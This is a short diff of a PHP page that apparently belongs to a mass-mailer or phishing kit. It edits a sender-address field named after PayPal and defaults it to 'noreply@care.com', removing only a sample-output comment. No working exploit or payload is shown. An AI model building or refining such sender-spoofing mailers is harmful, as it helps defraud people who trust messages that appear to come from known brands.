@@ -320,7 +320,7 @@ exit;}
 <span style="font-size:13px;color:#ffffff;"><? echo $Email ?></span>
 
 			<input name="noreply@paypal.com" type="text" value="<?php
-echo 'noreply@care.com';  # eg result: -Service@Random.com
+echo 'noreply@care.com';
 ?>" class="highlight highlight-source-json" id="Service" style="border-radius: 15px; width:100%" placeholder="Email">
 
   <? $Letter = "Letter"; ?>
